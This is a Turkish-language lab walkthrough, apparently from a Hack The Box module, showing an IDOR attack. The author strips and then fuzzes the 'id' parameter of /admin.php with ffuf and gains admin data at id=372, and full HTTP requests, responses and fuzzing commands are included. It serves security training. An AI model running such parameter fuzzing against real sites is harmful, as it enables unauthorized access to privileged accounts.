# Parameter Modification

Web uygulamasına giriş yapmayı denediğimizde /login.php sayfasına bir POST isteği gönderiliyor olsun:

```http title="Request" hl_lines="1 14 18"
POST /login.php HTTP/1.1
Host: 94.237.54.116:33283
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://94.237.54.116:33283
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.54.116:33283/
Cookie: PHPSESSID=mnqbta4ovasegu2ggijekchubm
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=htb-student&password=Password123
```

Giriş başarılı olduktan sonra /admin.php?id=183 sayfasına yönlendiren bir 302 Found yanıtı alırız:

```http title="Response" hl_lines="1 7"
HTTP/1.1 302 Found
Date: Sat, 08 Feb 2025 10:00:08 GMT
Server: Apache/2.4.59 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /admin.php?id=183
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Follow redirection ile yönlendirmeyi takip edersek aşağıda verilen GET isteği gerçekleşir:

```http title="Request" hl_lines="1"
GET /admin.php?id=183 HTTP/1.1
Host: 94.237.54.116:33283
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://94.237.54.116:33283
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.54.116:33283/login.php
Cookie: PHPSESSID=mnqbta4ovasegu2ggijekchubm
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Dönen yanıt yeterli ayrıcalıklara sahip olmadığımızı bildirir:

```html title="Response" hl_lines="5"
<!-- Section: Visitor -->
<section class="section section-visitors blue lighten-4">
    <div class="row">
        <div class="row">
            <center><h4>Could not load admin data. Please check your privileges.</h4></center>
        </div>
```

Daha önceden gönderilen GET isteğini ?id=183 sorgusu olmadan tekrar gönderelim:

```http title="Request" hl_lines="1"
GET /admin.php HTTP/1.1
Host: 94.237.54.116:33283
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://94.237.54.116:33283
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.54.116:33283/login.php
Cookie: PHPSESSID=mnqbta4ovasegu2ggijekchubm
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Sorgu gönderildikten sonra /login.php sayfasına yönlendiren bir 302 Found yanıtı alırız:

```http title="Response" hl_lines="1 7"
HTTP/1.1 302 Found
Date: Sat, 08 Feb 2025 10:24:08 GMT
Server: Apache/2.4.59 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Follow redirection ile yönlendirmeyi takip edersek aşağıda verilen GET isteği gerçekleşir:

```http title="Request" hl_lines="1 12"
GET /login.php HTTP/1.1
Host: 94.237.54.116:33283
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://94.237.54.116:33283
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.54.116:33283/admin.php
Cookie: PHPSESSID=mnqbta4ovasegu2ggijekchubm
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

!!! success

    Dikkat edersek mevcut oturuma ait PHPSESSID çerezi geçerliliğini korumaktadır.

Ayrıcalıklı bir hesap bulmak için Ffuf aracını kullanalım:

```sh
my@attack:~$ seq 1 1000 > ids.txt
my@attack:~$ ffuf -ic -w ids.txt:FUZZ -u "http://94.237.54.116:33283/admin.php?id=FUZZ" -fs 14484
```

```output title="Output"
372                     [Status: 200, Size: 14465, Words: 4165, Lines: 429, Duration: 71ms]
```

Elde edilen ?id=372 sorgusunu kullanarak /admin.php sayfasına bir GET isteği gönderelim:

```http title="Request" hl_lines="1"
GET /admin.php?id=372 HTTP/1.1
Host: 94.237.54.116:33283
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://94.237.54.116:33283
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.54.116:33283/login.php
Cookie: PHPSESSID=mnqbta4ovasegu2ggijekchubm
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Dönen yanıt yeterli ayrıcalıklara sahip olduğumuzu bildirir:

```html title="Response" hl_lines="5"
<!-- Section: Visitor -->
<section class="section section-visitors blue lighten-4">
    <div class="row">
        <div class="row">
            <center><h4>Admin data.</h4></center>
        </div>
```
